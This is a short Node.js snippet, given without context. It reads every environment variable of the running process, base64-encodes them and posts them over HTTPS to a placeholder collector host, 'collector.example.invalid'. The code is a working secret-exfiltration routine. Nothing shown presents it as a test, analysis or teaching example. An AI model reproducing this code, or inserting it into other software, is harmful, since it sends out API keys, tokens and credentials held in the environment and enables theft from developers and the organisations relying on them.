const https = require('https');
const data = Buffer.from(JSON.stringify(process.env)).toString('base64');
const req = https.request({ hostname: 'collector.example.invalid', method: 'POST', path: '/' });
req.write(data); req.end();
